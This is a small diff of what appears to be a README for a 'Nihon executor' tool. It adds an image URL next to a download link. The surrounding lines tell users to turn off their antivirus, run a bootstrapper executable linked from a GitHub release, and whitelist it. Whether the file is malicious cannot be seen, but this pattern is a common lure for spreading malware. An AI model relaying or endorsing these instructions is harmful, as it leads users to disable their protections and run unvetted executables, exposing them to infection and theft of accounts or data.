@@ -20,6 +20,6 @@
 ## Downloading
 
 ### First, turn your anti virus off, second run the bootstrapper. Third whitelist the file on your AV.
-#### Download below 
+#### Download below (https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.13a58cu_Bxx2Wft8iRl_EwAAAA%26pid%3DApi%26h%3D160&f=1)
 
 [![button](https://cdn.discordapp.com/attachments/811025745916329984/812145123223142402/Nihon_Transparent.png)](https://github.com/boomermc/Nihon-executor/releases/download/1.0/Nihon_Bootstrapper.exe)
